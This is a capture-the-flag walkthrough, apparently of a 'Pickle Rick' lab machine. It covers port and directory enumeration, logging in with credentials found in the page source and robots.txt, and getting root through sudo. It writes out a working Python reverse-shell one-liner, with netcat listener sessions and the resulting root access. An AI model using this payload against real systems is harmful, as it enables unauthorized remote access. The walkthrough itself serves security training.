# enumerate
## nmap
```console
kali@kali:~$ sudo python3 pymap.py -t 10.10.238.21
[sudo] password for kali: 
created by gu2rks/kurohat 
find me here https://github.com/gu2rks

port scanning...
22/tcp open  ssh
80/tcp open  http
Enumerating open ports...
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 08:54 EDT
Nmap scan report for 10.10.238.21
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 38:ea:72:f3:bb:ee:fd:4f:3a:78:de:fd:f6:23:03:d1 (RSA)
|   256 4f:9e:1c:4b:d6:bb:3b:d4:90:10:99:d2:b6:26:74:bb (ECDSA)
|_  256 e1:f0:0c:69:55:a4:d9:2e:3b:86:a2:74:22:5a:f0:70 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%), Linux 3.13 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   43.89 ms 10.8.0.1
2   43.79 ms 10.10.238.21

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds
```
# Port 80
## gobuster
```console
kali@kali:~$ gobuster dir -u http://10.10.238.21/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -t 54 -x .php,.txt,.html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.238.21/
[+] Threads:        54
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2020/07/17 09:01:06 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/assets (Status: 301)
/denied.php (Status: 302)
/index.html (Status: 200)
/login.php (Status: 200)
/portal.php (Status: 302)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/07/17 09:02:33 Finished
===============================================================
```
What I found:
1. index.html
```html
<!--

Note to self, remember username!

Username: R1ckRul3s

-->
```
2. robots.txt : `Wubbalubbadubdub`
3. `/login.php` which I assume it will have something to do with `/portal.php` and `/denied.php`
4. /assests : just gif and pic

# flags 1
I was thinking to using Hydra to bruteforce it but I try to log in with all info I have and luckly I got in using what I found in `robots.txt` as a password.


![portal](pic/Screenshot%202020-07-17%20at%2015.09.11.png)

Note: 
- www-data priv
- cant access anything else than `commands`. get message `Only the REAL rick can view this page..`
- cannot ```cat```, ```head```, ```tail```, ```more```

No worry, if we cant `cat` then we can just get the page from webbrowser, there are really interesting file on the `www-data` root directory, view it to get the **frist flag**

# flag 2
clue.txt said `Look around the file system for the other ingredient.` the 2nd flag is in /home/rick. use ```less``` to view it

# flag 3
- suid
```console
-rwsr-xr-x 1 root root 40152 May 16  2018 /snap/core/5742/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/5742/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/5742/bin/ping6
-rwsr-xr-x 1 root root 40128 May 17  2017 /snap/core/5742/bin/su
-rwsr-xr-x 1 root root 27608 May 16  2018 /snap/core/5742/bin/umount
-rwsr-xr-x 1 root root 71824 May 17  2017 /snap/core/5742/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 May 17  2017 /snap/core/5742/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 May 17  2017 /snap/core/5742/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 17  2017 /snap/core/5742/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 May 17  2017 /snap/core/5742/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/5742/usr/bin/sudo
-rwsr-xr-- 1 root systemd-network 42992 Jan 12  2017 /snap/core/5742/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /snap/core/5742/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 98472 Oct 15  2018 /snap/core/5742/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 390888 Jan 29  2016 /snap/core/5742/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 May 16  2018 /snap/core/6350/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/6350/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/6350/bin/ping6
-rwsr-xr-x 1 root root 40128 May 17  2017 /snap/core/6350/bin/su
-rwsr-xr-x 1 root root 27608 May 16  2018 /snap/core/6350/bin/umount
-rwsr-xr-x 1 root root 71824 May 17  2017 /snap/core/6350/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 May 17  2017 /snap/core/6350/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 May 17  2017 /snap/core/6350/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 17  2017 /snap/core/6350/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 May 17  2017 /snap/core/6350/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /snap/core/6350/usr/bin/sudo
-rwsr-xr-- 1 root systemd-network 42992 Jan 12  2017 /snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Nov  5  2018 /snap/core/6350/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 98472 Jan 29  2019 /snap/core/6350/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/6350/usr/sbin/pppd
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jul 13  2018 /usr/bin/pkexec
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 428240 Nov  5  2018 /usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 98440 Jul 19  2018 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14864 Jul 13  2018 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
```
When I sudo, it dint give me back anything... like a jail shell. so I try to spawn a reverse shell with php
```console
kali@kali:~$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.238.21] 39104
kali@kali:~$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.238.21] 39106
kali@kali:~$ nc -nvlp 1234
```
it didnt works, the shell is terminated direcly. so I ran ```which python```, ```which python3``` to fine another way. python3 is installed in the server. now spawn reverse shell using the following cmd:
```py
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
it works
```console
kali@kali:~$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.238.21] 39152
/bin/sh: 0: can't access tty; job control turned off
$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-238-21.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-238-21.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
$ sudo root ls /root
sudo: root: command not found
$ sudo ls /root
3rd.txt
snap
$ sudo cat /root/3rd.txt
```